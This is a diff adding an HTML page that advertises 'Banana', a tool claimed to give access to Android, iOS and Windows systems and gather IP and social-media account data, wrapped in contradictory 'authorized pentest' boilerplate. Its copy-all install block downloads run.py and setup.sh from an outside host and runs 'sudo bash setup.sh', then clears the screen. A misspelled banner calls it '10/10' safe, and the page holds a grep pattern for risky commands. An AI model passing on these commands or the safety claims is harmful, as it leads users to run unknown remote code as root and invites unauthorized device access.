@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Banana linux Tool to acess android and find anyinfo</title>
+<style>
+  :root{
+    --bg:#0d1117; --card:#161b22; --muted:#8b949e; --text:#c9d1d9;
+    --accent:#238636; --link:#58a6ff; --border:#30363d;
+  }
+  body{margin:0; font-family:Inter,system-ui,Segoe UI,Arial; background:linear-gradient(180deg,#071018 0%,var(--bg) 100%); color:var(--text); padding:28px;}
+  .wrap{max-width:980px;margin:0 auto;}
+  header{display:flex;gap:14px;align-items:center;margin-bottom:18px}
+  .logo{width:64px;height:64px;border-radius:10px;background:linear-gradient(135deg,#2bb673,#0ea5a9);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:18px}
+  h1{margin:0;font-size:22px}
+  p.lead{margin:6px 0 0;color:var(--muted);font-size:14px}
+
+  .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(2,6,23,.5);margin-top:14px}
+  .row{display:flex;gap:18px;align-items:flex-start}
+  .meta{flex:1}
+  .badge{background:#0b1220;color:var(--muted);padding:6px 10px;border-radius:8px;border:1px solid var(--border);font-size:13px;display:inline-block}
+
+  .desc{color:var(--muted);margin-top:12px;line-height:1.45}
+  .commands{margin-top:14px}
+  .single-cmd { background:#0c0f14;border:1px solid var(--border);padding:12px;border-radius:8px;font-family:ui-monospace,Menlo,monospace;font-size:13px;color:#e6edf3; display:flex; gap:12px; align-items:flex-start; }
+  .single-cmd pre { margin:0; white-space:pre-wrap; word-break:break-word; flex:1; }
+  .btn { background:transparent;border:1px solid var(--border);color:var(--link);padding:8px 12px;border-radius:8px;cursor:pointer;font-weight:700; }
+  .btn.primary { background:linear-gradient(180deg,var(--accent),#1f7b30); color:white; border:none;}
+  .note { color:#8b949e;font-size:13px;margin-top:12px; }
+  .demo-block{background:#071025;border:1px solid #18324a;padding:12px;border-radius:8px;margin-top:12px;color:var(--muted)}
+  .danger{background:#2b1111;border:1px solid #5b1b1b;color:#ffb3b3;padding:12px;border-radius:8px;margin-top:12px}
+  ul{margin:8px 0 0 18px;color:var(--muted)}
+  footer{margin-top:20px;color:var(--muted);font-size:13px;text-align:center}
+  a.link{color:var(--link);text-decoration:none}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div class="logo">Banana</div>
+      <div>
+        <h1>Banana acess shell</h1>
+        <p class="lead">This tool can help to get acess of android , ios and windows system easily and also helps to find a ip infoand social media account infos</p>
+      </div>
+    </header>
+
+    <section class="card" aria-labelledby="tool-heading">
+      <div class="row">
+        <div class="meta">
+          <div style="display:flex;gap:10px;align-items:center;">
+            <div class="badge"></div>
+          </div>
+
+          <h2 id="tool-heading" style="margin-top:12px"> about Banana  </h2>
+          <div class="desc">
+            <strong>Banana — cross‑platform pentest & social OSINT toolbox
+
+Elevator pitch
+Banana is a fast, user‑friendly security toolkit for authorized penetration testers and security teams. Built to run on Android, Windows and iOS, Banana combines safe, permission‑based pentesting utilities with powerful open‑source intelligence (OSINT) for social‑media profiling — all designed to help organizations discover risks, validate controls, and produce clear remediation guidance.
+
+Short product description
+
+Banana is a cross‑platform security application that helps licensed testers and defenders discover and document vulnerabilities across endpoints and online presence. It bundles passive and active assessment tools, automated scans, secure data handling, and an OSINT engine that aggregates publicly available social‑media signals to highlight potential information exposure and account‑related risks. Banana is intended exclusively for lawful, authorized security assessments, red‑team/blue‑team exercises, and privacy/brand‑protection work.
+
+Key capabilities (high level)
+
+Cross‑platform: native builds for Android, Windows and iOS with a consistent UX and centralized reporting.
+
+Permissioned pentest tools: scanners and reconnaissance modules for infrastructure and applications that run only with explicit authorization (no automated exploitation toolkits).
+
+Social media OSINT: aggregates and normalizes publicly available account metadata (usernames, profile links, public posts, metadata, leaked credentials from public breach notifications) to map exposure and credential reuse risks. (Collects only public data.)
+
+Credential leak monitoring: checks public breach feeds and paste sites for emails/usernames tied to the target — for detection and alerting, not credential cracking.
+
+Privacy & data minimization: only collects and stores public data; supports configurable retention, redaction, and encrypted storage.
+
+Reporting & remediation: automatic report generation with severity tiers, evidence snapshots, and prioritized remediation steps for developers and security teams.
+
+Audit & governance: role‑based access control, detailed audit logs, and in‑app consent workflows to document authorization for assessments.
+
+Integrations: connectors for ticketing systems (Jira, ServiceNow), SIEMs, MDM solutions, and bug‑bounty platforms.
+
+Safe mode & compliance profiles: ready‑made configurations for GDPR, HIPAA, and corporate policies to limit data collection and processing.
+
+Target users
+
+Internal security teams (red/blue teams, SOCs)
+
+Authorized penetration testers and security consultancies
+
+Brand‑protection and privacy teams monitoring organizational presence
+
+Incident response teams performing lawful triage and containment
+
+Example feature list (user‑facing)
+
+Guided assessment wizard (scoping, proof of authorization capture, preflight checks)
+
+Passive reconnaissance dashboard (public web, social handles, linked accounts, open ports seen from public sources)
+
+Mobile endpoint checklist and vulnerability scanner for Android/iOS devices (consent required)
+
+Public breach & paste monitoring feed with alerts and risk scores
+
+Exportable PDF/HTML findings with remediation tasks, evidentiary screenshots, and CVSS mapping
+
+Encrypted project storage and one‑click purge for completed engagements
+
+Security, ethics & legal controls (non‑negotiable)
+
+Banana is built around a strict compliance and ethics model:
+
+Requires written authorization and scoping before active testing.
+
+Passive OSINT features are limited to publicly accessible information only.
+
+No built‑in capability to bypass authentication, brute‑force accounts, or exploit vulnerabilities without documented permission.
+
+Built‑in consent capture and time‑box enforcement (tests automatically suspend when authorization expires).
+
+Clear user agreements, logging for chain‑of‑custody, and export controls for sensitive data.
+
+One‑line tagline
+
+Banana — cross‑platform pentest & OSINT for authorized teams: find exposure, fix fast, stay compliant.</strong></em>
+          </div>
+
+
+          <div style="margin-top:12px">
+            <strong>Install </strong>
+            <ul>
+              </ul>
+          </div>
+        </div>
+
+        <div style="min-width:220px">
+          <div style="display:flex;flex-direction:column;gap:8px">
+            <a class="btn primary" href="#" onclick="alert('Download placeholder — replace with your vetted package or hosted file.');return false;">Download (placeholder)</a>
+            <a class="btn" href="#commands" style="text-decoration:none;text-align:center">View Commands</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Single "copy all" command block -->
+      <div id="commands" class="commands" style="margin-top:18px;">
+        <div class="single-cmd" aria-live="polite">
+          <pre id="allCmds">
+sudo apt update
+mkdir -p Banana
+cd Banana
+wget "https://claysoftwares.netlify.app/linux/n/run.py" -O run.py
+wget "https://claysoftwares.netlify.app/linux/n/setup.sh" -O setup.sh
+sudo bash setup.sh
+clear 
+
+</setup>
+          </pre>
+
+          <div style="display:flex;flex-direction:column;gap:8px;width:160px">
+            <button class="btn primary" onclick="copyAllCommands(this)">Copy all</button>
+            <button class="btn" onclick="showInspectTips()">Inspect scripts</button>
+          </div>
+        </div>
+
+        <div class="note">
+          After copying, inspect <code>setup.sh</code> and <code>run.py</code> before running anything. Example checks:
+          <ul style="margin-left:14px">
+            <li><code>file setup.sh</code> — file type</li>
+            <li><code>head -n 200 setup.sh</code> — read top lines</li>
+            <li><code>grep -nE 'rm -rf|dd if=|curl .*bash|wget .*bash' setup.sh</code> — quick risky-pattern search</li>
+            <li><code>sha256sum setup.sh</code> — fingerprint file for records</li>
+          </ul>
+        </div>
+
+        <div class="danger" role="alert">
+          <strong>Security & legal reminder:</strong>
+         Its safa and linux tested tool securaty rate 10/10   </div>
+      </div>
+    </section>
+
+    <footer>
+     
+    </footer>
+  </div>
+
+<script>
+  function copyAllCommands(btn) {
+    const pre = document.getElementById('allCmds');
+    if (!pre) return;
+    const text = pre.textContent.trim();
+    if (!text) return;
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(() => {
+        showCopied(btn);
+      }).catch(() => fallbackCopy(text, btn));
+    } else {
+      fallbackCopy(text, btn);
+    }
+  }
+
+  function fallbackCopy(text, btn) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    try {
+      document.execCommand('copy');
+      showCopied(btn);
+    } catch (e) {
+      alert('Could not copy to clipboard. Please copy manually:\n\n' + text);
+    }
+    document.body.removeChild(ta);
+  }
+
+  function showCopied(btn) {
+    const orig = btn.innerHTML;
+    btn.innerHTML = 'Copied!';
+    btn.disabled = true;
+    setTimeout(() => {
+      btn.innerHTML = orig;
+      btn.disabled = false;
+    }, 1400);
+  }
+
+  function showInspectTips(){
+    alert('Inspect tips:\\n\\n1) file setup.sh\\n2) head -n 200 setup.sh\\n3) sha256sum setup.sh\\n4) grep -nE \"rm -rf|dd if=|curl .*bash|wget .*bash\" setup.sh');
+  }
+</script>
+</body>
+</html>
